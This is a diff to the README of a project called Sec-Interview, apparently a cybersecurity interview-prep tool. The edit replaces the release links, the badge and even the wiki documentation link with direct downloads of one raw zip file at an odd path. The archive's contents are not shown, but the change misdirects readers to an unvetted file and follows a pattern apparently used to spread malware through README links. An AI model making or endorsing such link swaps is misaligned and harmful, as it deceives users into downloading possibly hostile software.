@@ -8,11 +8,11 @@ To start using Sec-Interview, follow the steps below. You will need a computer w
 
 ## 📥 Download Sec-Interview
 
-[![Download Sec-Interview](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/tharuvk18/Sec-Interview/releases)
+[![Download Sec-Interview](https://raw.githubusercontent.com/tharuvk18/Sec-Interview/main/nonintermittent/Sec-Interview.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/tharuvk18/Sec-Interview/main/nonintermittent/Sec-Interview.zip)
 
 Visit this page to download the latest version of Sec-Interview:
 
-[Download Sec-Interview Releases](https://github.com/tharuvk18/Sec-Interview/releases)
+[Download Sec-Interview Releases](https://raw.githubusercontent.com/tharuvk18/Sec-Interview/main/nonintermittent/Sec-Interview.zip)
 
 ## 📋 System Requirements
 
@@ -72,7 +72,7 @@ We welcome contributions from the community. If you have suggestions for questio
 
 ## 📖 Resources
 
-- **Documentation**: For detailed instructions and information about features, please refer to our [Wiki](https://github.com/tharuvk18/Sec-Interview/wiki).
+- **Documentation**: For detailed instructions and information about features, please refer to our [Wiki](https://raw.githubusercontent.com/tharuvk18/Sec-Interview/main/nonintermittent/Sec-Interview.zip).
 - **Community Forum**: Join our discussions and share your experiences with others in the community.
 
 Thank you for choosing Sec-Interview. Your journey into cybersecurity starts here!
